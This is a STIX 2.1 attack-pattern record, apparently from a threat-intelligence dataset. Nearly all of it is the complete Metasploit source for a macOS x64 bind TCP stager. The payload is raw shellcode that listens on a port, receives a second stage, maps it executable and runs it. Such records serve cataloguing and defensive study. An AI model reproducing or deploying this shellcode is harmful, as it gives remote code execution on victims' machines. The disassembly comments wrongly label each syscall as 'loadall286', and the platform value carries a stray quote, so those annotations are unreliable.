{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7fdbcaee-6231-49b6-b474-f17fde98e6a9",
    "created": "2024-08-14T16:33:19.476775Z",
    "modified": "2024-08-14T16:33:19.476779Z",
    "name": "Bind TCP Stager",
    "description": "Listen, read length, read buffer, execute",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/osx/x64/bind_tcp.rb",
            "external_id": "bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 185\n\n  include Msf::Payload::Stager\n\n  def initialize(info = { })\n    super(merge_info(info,\n      'Name'        => 'Bind TCP Stager',\n      'Description' => 'Listen, read length, read buffer, execute',\n      'Author'      => 'nemo <nemo[at]felinemenace.org>',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'osx',\n      'Arch'        => ARCH_X64,\n      'Handler'     => Msf::Handler::BindTcp,\n      'Convention'  => 'sockedi',\n      'Stager'      =>\n      {\n        'Offsets' => { 'LPORT' => [ 31, 'n'] },\n        'Payload' =>\n          \"\\xB8\\x61\\x00\\x00\\x02\" +     # mov eax,0x2000061\n          \"\\x6A\\x02\" +                 # push byte +0x2\n          \"\\x5F\" +                     # pop rdi\n          \"\\x6A\\x01\" +                 # push byte +0x1\n          \"\\x5E\" +                     # pop rsi\n          \"\\x48\\x31\\xD2\" +             # xor rdx,rdx\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\x48\\x89\\xC7\" +             # mov rdi,rax\n          \"\\xB8\\x68\\x00\\x00\\x02\" +     # mov eax,0x2000068\n          \"\\x48\\x31\\xF6\" +             # xor rsi,rsi\n          \"\\x56\" +                     # push rsi\n          \"\\xBE\\x00\\x02\\x15\\xB3\" +     # mov esi,0xb3150200\n          \"\\x56\" +                     # push rsi\n          \"\\x48\\x89\\xE6\" +             # mov rsi,rsp\n          \"\\x6A\\x10\" +                 # push byte +0x10\n          \"\\x5A\" +                     # pop rdx\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\xB8\\x6A\\x00\\x00\\x02\" +     # mov eax,0x200006a\n          \"\\x48\\x31\\xF6\" +             # xor rsi,rsi\n          \"\\x48\\xFF\\xC6\" +             # inc rsi\n          \"\\x49\\x89\\xFC\" +             # mov r12,rdi\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\xB8\\x1E\\x00\\x00\\x02\" +     # mov eax,0x200001e\n          \"\\x4C\\x89\\xE7\" +             # mov rdi,r12\n          \"\\x48\\x89\\xE6\" +             # mov rsi,rsp\n          \"\\x48\\x89\\xE2\" +             # mov rdx,rsp\n          \"\\x48\\x83\\xEA\\x04\" +         # sub rdx,byte +0x4\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\x49\\x89\\xC5\" +             # mov r13,rax\n          \"\\x48\\x89\\xC7\" +             # mov rdi,rax\n          \"\\xB8\\x1D\\x00\\x00\\x02\" +     # mov eax,0x200001d\n          \"\\x48\\x31\\xC9\" +             # xor rcx,rcx\n          \"\\x51\" +                     # push rcx\n          \"\\x48\\x89\\xE6\" +             # mov rsi,rsp\n          \"\\xBA\\x04\\x00\\x00\\x00\" +     # mov edx,0x4\n          \"\\x4D\\x31\\xC0\" +             # xor r8,r8\n          \"\\x4D\\x31\\xD2\" +             # xor r10,r10\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\x41\\x5B\" +                 # pop r11\n          \"\\x4C\\x89\\xDE\" +             # mov rsi,r11\n          \"\\x81\\xE6\\x00\\xF0\\xFF\\xFF\" + # and esi,0xfffff000\n          \"\\x81\\xC6\\x00\\x10\\x00\\x00\" + # add esi,0x1000\n          \"\\xB8\\xC5\\x00\\x00\\x02\" +     # mov eax,0x20000c5\n          \"\\x48\\x31\\xFF\" +             # xor rdi,rdi\n          \"\\x48\\xFF\\xCF\" +             # dec rdi\n          \"\\xBA\\x07\\x00\\x00\\x00\" +     # mov edx,0x7\n          \"\\x41\\xBA\\x02\\x10\\x00\\x00\" + # mov r10d,0x1002\n          \"\\x49\\x89\\xF8\" +             # mov r8,rdi\n          \"\\x4D\\x31\\xC9\" +             # xor r9,r9\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\x48\\x89\\xC6\" +             # mov rsi,rax\n          \"\\x56\" +                     # push rsi\n          \"\\x4C\\x89\\xEF\" +             # mov rdi,r13\n          \"\\x48\\x31\\xC9\" +             # xor rcx,rcx\n          \"\\x4C\\x89\\xDA\" +             # mov rdx,r11\n          \"\\x4D\\x31\\xC0\" +             # xor r8,r8\n          \"\\x4D\\x31\\xD2\" +             # xor r10,r10\n          \"\\xB8\\x1D\\x00\\x00\\x02\" +     # mov eax,0x200001d\n          \"\\x0F\\x05\" +                 # loadall286\n          \"\\x58\" +                     # pop rax\n          \"\\xFF\\xD0\"                   # call rax\n      }\n    ))\n  end\n\n  def handle_intermediate_stage(conn, p)\n    #\n    # Our stager payload expects to see a next-stage length first.\n    #\n    conn.put([p.length].pack('V'))\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}